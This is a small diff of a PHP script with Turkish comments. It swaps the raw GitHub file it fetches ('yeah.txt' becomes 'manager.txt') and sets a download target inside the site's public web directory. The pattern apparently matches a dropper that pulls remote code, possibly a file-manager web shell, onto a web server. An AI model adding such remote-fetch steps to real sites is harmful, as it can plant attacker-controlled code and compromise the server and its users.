@@ -1,6 +1,6 @@
 <?php
 // Hedef URL
-$url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt";
+$url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt";
 
 // İndirilecek dosya yolu
 $targetDir = __DIR__ . '/public/';
